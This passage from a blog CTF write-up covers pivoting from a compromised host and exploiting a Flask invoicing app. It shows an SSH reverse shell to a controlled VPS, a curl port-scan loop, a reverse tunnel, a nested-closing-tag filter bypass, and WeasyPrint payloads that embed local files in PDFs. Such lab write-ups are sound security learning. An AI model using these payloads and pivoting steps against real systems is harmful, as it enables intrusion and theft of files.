<p>In order to assist in the assessment of the server I used my <a href="https://github.com/ajxchapman/sshreverseshell">SSHReverseShell</a> tool, creating new SSH keys on the server using the <code class="highlighter-rouge">ssh-keygen</code> command, and connecting a reverse ssh shell back to a VPS I controlled. This gave me secure full TTY shell on the compromised server with which to explore further. After finding few files of interest (barring the source code to the previous level of course F439685), I went looking at the network.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip address
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
188: eth0@if189: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    <span class="nb">link</span>/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
</code></pre></div></div>
<p>This showed that the compromised host was on the <code class="highlighter-rouge">172.27.0.3/16</code> private network. Using <code class="highlighter-rouge">curl</code> as a rudimentary portscanner I quickly found that I could only obviously route network traffic to 3 hosts in this network range. Further more I identified HTTP servers on all 3 of the routable hosts.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..255<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>j <span class="k">in </span>22 80 443<span class="p">;</span> <span class="k">do </span><span class="nv">ERROR</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-sS</span> 172.27.0.<span class="nv">$i</span>:<span class="nv">$j</span> 2&gt;&amp;1 1&gt;/dev/null<span class="si">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"172.27.0.</span><span class="nv">$i</span><span class="s2">:</span><span class="nv">$j</span><span class="se">\t</span><span class="k">${</span><span class="nv">ERROR</span><span class="k">:-</span><span class="nv">Open</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done

</span>172.27.0.1:22   curl: <span class="o">(</span>56<span class="o">)</span> Recv failure: Connection reset by peer
172.27.0.1:80   Open
172.27.0.1:443  curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.1 port 443: Connection refused
172.27.0.2:22   curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.2 port 22: Connection refused
172.27.0.2:80   Open
172.27.0.2:443  curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.2 port 443: Connection refused
172.27.0.3:22   curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.3 port 22: Connection refused
172.27.0.3:80   Open
172.27.0.3:443  curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.3 port 443: Connection refused
172.27.0.4:22   curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.4 port 22: No route to host
172.27.0.4:80   curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.4 port 80: No route to host
172.27.0.4:443  curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.4 port 443: No route to host
172.27.0.5:22   curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.5 port 22: No route to host
172.27.0.5:80   curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.5 port 80: No route to host
172.27.0.5:443  curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.5 port 443: No route to host
172.27.0.6:22   curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 172.27.0.6 port 22: No route to host
...
</code></pre></div></div>

<p><img src="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/shell.gif" alt="Screencast" /></p>

<p>A quick check with <code class="highlighter-rouge">curl</code> showed that the webservers on two of the IP addresses were pointing at the previous FliteThermostat Backend application, whilst the 3rd was hosting a new application, and the next stage of the CTF.</p>

<p>Using SSH to reverse tunnel traffic through the compromised host to the new web server I could access the new application from my browser:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-N</span> <span class="nt">-R</span> 8001:172.27.0.2:80 <span class="nt">-o</span> <span class="s2">"StrictHostKeyChecking no"</span> <span class="nt">-o</span> <span class="s2">"UserKnownHostsFile /dev/null"</span> &lt;user&gt;@&lt;server&gt;
</code></pre></div></div>
<p><img src="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/application.png" alt="Application" /></p>

<h4 id="attachments-1">Attachments</h4>
<ul>
  <li><a href="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/main_2.py">main_2.py</a></li>
</ul>

<h4 id="tools-4">Tools</h4>
<ul>
  <li><a href="https://github.com/ajxchapman/sshreverseshell">SSHReverseShell</a></li>
</ul>

<h3 id="summary-of-issues-4">Summary of Issues</h3>
<ul>
  <li>Web application running as root user</li>
  <li>Insufficient network segregation</li>
</ul>

<h2 id="stage-6---hackerone-accounting-application">Stage 6 - HackerOne Accounting Application</h2>
<p>Tunnelling through to the compromised host at http://172.27.0.2:80 provided access to YAPFA (Yet Another Python Flask Application).</p>

<p>Accessing each of the available links of the application presented a login page. Reviewing the login page it appeared that the <code class="highlighter-rouge">password</code> parameter was vulnerable to some form of injection. Adding the tick character <code class="highlighter-rouge">'</code> the application responded with a HTTP 500 error, adding two in a row <code class="highlighter-rouge">''</code> the application returned a 200 status. However, there were oddities in this behaviour, for example a password value of <code class="highlighter-rouge">pas'sw'ord</code> also returned a 200 status, where a 500 error would be expected on a real injection vulnerability. This indicated there was something odd going on with this parameter, but it definitely was not a straight forward SQL or NoSQL injection.</p>

<p>Further analysis of the application HTML identified a commented out link on the <code class="highlighter-rouge">/invoices</code> page:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--&lt;li  class="nav-item" &gt;
	&lt;a class="nav-link" href="/invoices/new"&gt;New Invoice&lt;/a&gt;
&lt;/li&gt;--&gt;</span>
</code></pre></div></div>

<p>Accessing this page presented application functionality instead of the expected login form. This application page allowed the preparation of invoices, previewing them in HTML format or downloading them as PDFs.</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/invoices/preview?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://127.0.0.1:8001/invoices/new</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
</code></pre></div></div>

<p>The obvious first step was to go looking for HTML injection issues with a goal of being able to have the PDF renderer parse arbitrary HTML. Luckily I found one quite easily in sub-parameters of the <code class="highlighter-rouge">styles</code> JSON parameter. These parameters allowed the injection of all of the characters needed for HTML injection, <code class="highlighter-rouge">&lt;&gt;'= /</code>, e.g. <code class="highlighter-rouge">"styles":{"htmlinjection":{"&lt;b&gt;Test Injection":""}</code>, which would result in <code class="highlighter-rouge">&lt;b&gt;Test Injection</code> being returned within a <code class="highlighter-rouge">&lt;style&gt;</code> tag in the PDF preview.</p>

<p>This had one caveat, closing tags appeared to be stripped. In order to render injected HTML I needed to break out of the <code class="highlighter-rouge">&lt;style&gt;</code> tag the content was rendered in, but simply adding a closing tag <code class="highlighter-rouge">&lt;/style&gt;</code> did not work. A common issue with input sanitization is not recursively sanitizing the input. In this case, any tag which matched the regular expression <code class="highlighter-rouge">&lt;/[A-Za-z]+&gt;</code> appeared to be stripped, however, this could be bypassed by embedding one closing tag within another, e.g. <code class="highlighter-rouge">&lt;/&lt;/x&gt;style&gt;</code> when sanitized would result in <code class="highlighter-rouge">&lt;/style&gt;</code>, which is what was needed.</p>

<p>With the ability to inject arbitrary HTML into the PDF renderer, the next step was to try and exploit the PDF renderer itself. Common HTML rendering vulnerabilities include local file disclosure, and this was the issue I went looking for. I quickly identified that images on the local filesystem could be included in generated PDFs with a payload of <code class="highlighter-rouge">&lt;/&lt;/x&gt;style&gt;&lt;img+src='file:///usr/lib/python3.5/idlelib/Icons/idle_16.png'+/&gt;</code>, however methods commonly used for LFD were not working (<code class="highlighter-rouge">&lt;iframe&gt;</code>, <code class="highlighter-rouge">&lt;embed&gt;</code>, <code class="highlighter-rouge">&lt;object&gt;</code>, etc.) and injected JavaScript was not being executed. I also noticed that the PDFs had an embedded <code class="highlighter-rouge">/Creator</code> and <code class="highlighter-rouge">/Producer</code> tag of <code class="highlighter-rouge">cairo 1.14.8 (http://cairographics.org)</code>.</p>

<p>Googling for common PDF rendering engines gave numerous results (xhtml2pdf, pdfcrowd, pdfkit, etc.), however only one seemed to fit the constraints identified above, WeasyPrint. This was confirmed by attempting to render an image from a remote server under my control with the payload <code class="highlighter-rouge">&lt;/&lt;/x&gt;style&gt;&lt;img+src='http://images.example.com'+/&gt;</code>:</p>
<pre><code class="language-access.log">INFO - "104.196.12.98" - http://images.example.com:80 [11/Mar/2019:12:03:36 +0000] "GET / HTTP/1.1" 200 161 "-" "WeasyPrint 44 (http://weasyprint.org/)"
</code></pre>

<p><a href="https://github.com/Kozea/WeasyPrint">WeasyPrint</a> is an open source Python HTML to PDF library, so I went looking through the source code on GitHub. First thing that I noticed was this little gem from their documentation</p>

<blockquote>
  <p>When used with untrusted HTML or untrusted CSS, WeasyPrint can meet security problems. You will need extra configuration in your Python application to avoid high memory use, endless renderings or local files leaks.</p>
</blockquote>

<p>https://github.com/Kozea/WeasyPrint/blob/master/docs/tutorial.rst</p>

<p>Auditing the WeasyPrint source I quickly found the following interesting code comment:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#: File attachments, as a list of tuples of URL and a description or
#: :obj:`None`. (Defaults to the empty list.)
#: Extracted from the ``&lt;link rel=attachment&gt;`` elements in HTML
#: and written to the ``/EmbeddedFiles`` dictionary in PDF.
#:
#: .. versionadded:: 0.22
</span><span class="bp">self</span><span class="o">.</span><span class="n">attachments</span> <span class="o">=</span> <span class="n">attachments</span> <span class="ow">or</span> <span class="p">[]</span>
</code></pre></div></div>
<p><code class="highlighter-rouge">/weasyprint/document.py:319</code></p>

<p>This strongly suggested that if I injected a <code class="highlighter-rouge">&lt;link rel="attachment" href="URL"&gt;</code> tag, the URL pointed to by the <code class="highlighter-rouge">href</code> attributed would be embedded in the generated PDF document in an <code class="highlighter-rouge">/EmbeddedFile</code> stream. Further review of the source code confirmed this.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">elif</span> <span class="n">element</span><span class="o">.</span><span class="n">tag</span> <span class="o">==</span> <span class="s">'link'</span> <span class="ow">and</span> <span class="n">element_has_link_type</span><span class="p">(</span>
        <span class="n">element</span><span class="p">,</span> <span class="s">'attachment'</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">get_url_attribute</span><span class="p">(</span><span class="n">element</span><span class="p">,</span> <span class="s">'href'</span><span class="p">,</span> <span class="n">base_url</span><span class="p">)</span>
    <span class="n">title</span> <span class="o">=</span> <span class="n">element</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'title'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">url</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">LOGGER</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s">'Missing href in &lt;link rel="attachment"&gt;'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">attachments</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">url</span><span class="p">,</span> <span class="n">title</span><span class="p">))</span>
</code></pre></div></div>
<p><code class="highlighter-rouge">/weasyprint/html.py:307</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_write_pdf_embedded_files</span><span class="p">(</span><span class="n">pdf</span><span class="p">,</span> <span class="n">attachments</span><span class="p">,</span> <span class="n">url_fetcher</span><span class="p">):</span>
    <span class="s">"""Write attachments as embedded files (document attachments).
    :return:
        the object number of the name dictionary or :obj:`None`
    """</span>
    <span class="n">file_spec_ids</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">attachment</span> <span class="ow">in</span> <span class="n">attachments</span><span class="p">:</span>
        <span class="n">file_spec_id</span> <span class="o">=</span> <span class="n">_write_pdf_attachment</span><span class="p">(</span><span class="n">pdf</span><span class="p">,</span> <span class="n">attachment</span><span class="p">,</span> <span class="n">url_fetcher</span><span class="p">)</span>
</code></pre></div></div>
<p><code class="highlighter-rouge">/weasyprint/pdf.py:416</code></p>

<p>Finally, trying it out for real with the payload <code class="highlighter-rouge">&lt;/&lt;/x&gt;style&gt;&lt;link+rel='attachment'+href='file:///app/main.py'&gt;</code> confirmed the contents of the file was included in an <code class="highlighter-rouge">/EmbeddedFile</code> stream, and could be extracted through the FireFox PDF renderer to view the contents.</p>

<p><img src="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/embeddedfile.png" alt="EmbeddedFile" /></p>

<p>Gaining access to the <code class="highlighter-rouge">/app/main.py</code> file in this stage was the final flag in this CTF!</p>

<h4 id="attachments-2">Attachments:</h4>
<ul>
  <li><a href="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/main_3.py">main_3.py</a></li>
  <li><a href="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/pdfize.pdf">pdfize.pdf</a></li>
</ul>

<h3 id="summary-of-issues-5">Summary of Issues:</h3>
<ul>
  <li>HTML injection via insufficient input validation and sanitization</li>
  <li>PDF rendering Local File Disclosure</li>
</ul>

<h1 id="closing-thoughts">Closing thoughts</h1>
<p>Whilst the narrative presented here is the most direct route I <em>could</em> have taken to complete this CTF, it does gloss over the many hours of failure, rabbit holes dived into and red herrings chased. It specifically does not mention the many millions of requests made in vain whist attempting to guess query string parameters. It 100% ignores the day spent attempting to perform a timing attack to guess single characters at a time (instead of bytes). And it fails to reveal the full time spent scripting up character recognition when a pen and paper would have done the job just as well in less than 1/10 of the time.</p>

<p>I learned a huge amount participating, and failing hard, in this CTF and fortified my toolkit with many new and revised tools (<a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97">available here for you to try too</a>). Thanks to <a href="https://www.hackerone.com/">HackerOne</a> and <a href="https://twitter.com/daeken">@daeken</a> for putting this challenge together!</p>

  </div>

  <div class="postfooter">
    <a href="/">Home</a>
    
      <a href="/categories/bugbounty.html">More bug bounty posts</a>
    
  </div>
</article>



      <footer class="site-footer">
        
        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
      </footer>
    </main>
  </body>
</html>
